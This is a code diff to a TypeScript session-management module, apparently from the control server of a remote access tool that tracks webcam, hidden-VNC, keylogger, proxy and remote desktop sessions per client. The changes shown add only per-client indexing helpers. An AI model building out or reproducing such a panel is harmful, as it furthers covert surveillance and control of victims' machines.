@@ -14,12 +14,41 @@ const consoleSessions = new Map<string, ConsoleSession>();
 const rdSessions = new Map<string, RemoteDesktopViewer>();
 const webcamSessions = new Map<string, RemoteDesktopViewer>();
 const hvncSessions = new Map<string, RemoteDesktopViewer>(); // HVNC uses same structure as RD
+const rdSessionsByClient = new Map<string, Set<string>>();
+const webcamSessionsByClient = new Map<string, Set<string>>();
+const hvncSessionsByClient = new Map<string, Set<string>>();
 const fileBrowserSessions = new Map<string, FileBrowserViewer>();
 const processSessions = new Map<string, ProcessViewer>();
 const notificationSessions = new Map<string, NotificationsViewer>();
 const keyloggerSessions = new Map<string, KeyloggerViewer>();
 const proxySessions = new Map<string, KeyloggerViewer>(); // Reusing KeyloggerViewer interface for consistency
 const voiceSessions = new Map<string, VoiceViewer>();
+
+function addSessionToClientIndex(
+  index: Map<string, Set<string>>,
+  clientId: string,
+  sessionId: string,
+): void {
+  let set = index.get(clientId);
+  if (!set) {
+    set = new Set<string>();
+    index.set(clientId, set);
+  }
+  set.add(sessionId);
+}
+
+function removeSessionFromClientIndex(
+  index: Map<string, Set<string>>,
+  clientId: string,
+  sessionId: string,
+): void {
+  const set = index.get(clientId);
+  if (!set) return;
+  set.delete(sessionId);
+  if (set.size === 0) {
+    index.delete(clientId);
+  }
+}
 
 export function addConsoleSession(session: ConsoleSession): void {
   consoleSessions.set(session.id, session);
@@ -47,10 +76,12 @@ export function getAllConsoleSessions(): Map<string, ConsoleSession> {
 
 export function addRdSession(session: RemoteDesktopViewer): void {
   rdSessions.set(session.id, session);
+  addSessionToClientIndex(rdSessionsByClient, session.clientId, session.id);
 }
 
 export function addWebcamSession(session: RemoteDesktopViewer): void {
   webcamSessions.set(session.id, session);
+  addSessionToClientIndex(webcamSessionsByClient, session.clientId, session.id);
 }
 
 export function getWebcamSession(
@@ -60,11 +91,31 @@ export function getWebcamSession(
 }
 
 export function deleteWebcamSession(sessionId: string): boolean {
-  return webcamSessions.delete(sessionId);
+  const existing = webcamSessions.get(sessionId);
+  if (!existing) return false;
+  webcamSessions.delete(sessionId);
+  removeSessionFromClientIndex(webcamSessionsByClient, existing.clientId, sessionId);
+  return true;
 }
 
 export function getWebcamSessionsByClient(clientId: string): RemoteDesktopViewer[] {
-  return Array.from(webcamSessions.values()).filter((s) => s.clientId === clientId);
+  return getWebcamSessionsForClient(clientId);
+}
+
+export function getWebcamSessionsForClient(clientId: string): RemoteDesktopViewer[] {
+  const ids = webcamSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: RemoteDesktopViewer[] = [];
+  for (const id of ids) {
+    const session = webcamSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
+}
+
+export function hasWebcamSessionsForClient(clientId: string): boolean {
+  const ids = webcamSessionsByClient.get(clientId);
+  return Boolean(ids && ids.size > 0);
 }
 
 export function getAllWebcamSessions(): Map<string, RemoteDesktopViewer> {
@@ -78,11 +129,31 @@ export function getRdSession(
 }
 
 export function deleteRdSession(sessionId: string): boolean {
-  return rdSessions.delete(sessionId);
+  const existing = rdSessions.get(sessionId);
+  if (!existing) return false;
+  rdSessions.delete(sessionId);
+  removeSessionFromClientIndex(rdSessionsByClient, existing.clientId, sessionId);
+  return true;
 }
 
 export function getRdSessionsByClient(clientId: string): RemoteDesktopViewer[] {
-  return Array.from(rdSessions.values()).filter((s) => s.clientId === clientId);
+  return getRdSessionsForClient(clientId);
+}
+
+export function getRdSessionsForClient(clientId: string): RemoteDesktopViewer[] {
+  const ids = rdSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: RemoteDesktopViewer[] = [];
+  for (const id of ids) {
+    const session = rdSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
+}
+
+export function hasRdSessionsForClient(clientId: string): boolean {
+  const ids = rdSessionsByClient.get(clientId);
+  return Boolean(ids && ids.size > 0);
 }
 
 export function getAllRdSessions(): Map<string, RemoteDesktopViewer> {
@@ -93,6 +164,7 @@ export function getAllRdSessions(): Map<string, RemoteDesktopViewer> {
 
 export function addHvncSession(session: RemoteDesktopViewer): void {
   hvncSessions.set(session.id, session);
+  addSessionToClientIndex(hvncSessionsByClient, session.clientId, session.id);
 }
 
 export function getHvncSession(
@@ -102,11 +174,31 @@ export function getHvncSession(
 }
 
 export function deleteHvncSession(sessionId: string): boolean {
-  return hvncSessions.delete(sessionId);
+  const existing = hvncSessions.get(sessionId);
+  if (!existing) return false;
+  hvncSessions.delete(sessionId);
+  removeSessionFromClientIndex(hvncSessionsByClient, existing.clientId, sessionId);
+  return true;
 }
 
 export function getHvncSessionsByClient(clientId: string): RemoteDesktopViewer[] {
-  return Array.from(hvncSessions.values()).filter((s) => s.clientId === clientId);
+  return getHvncSessionsForClient(clientId);
+}
+
+export function getHvncSessionsForClient(clientId: string): RemoteDesktopViewer[] {
+  const ids = hvncSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: RemoteDesktopViewer[] = [];
+  for (const id of ids) {
+    const session = hvncSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
+}
+
+export function hasHvncSessionsForClient(clientId: string): boolean {
+  const ids = hvncSessionsByClient.get(clientId);
+  return Boolean(ids && ids.size > 0);
 }
 
 export function getAllHvncSessions(): Map<string, RemoteDesktopViewer> {
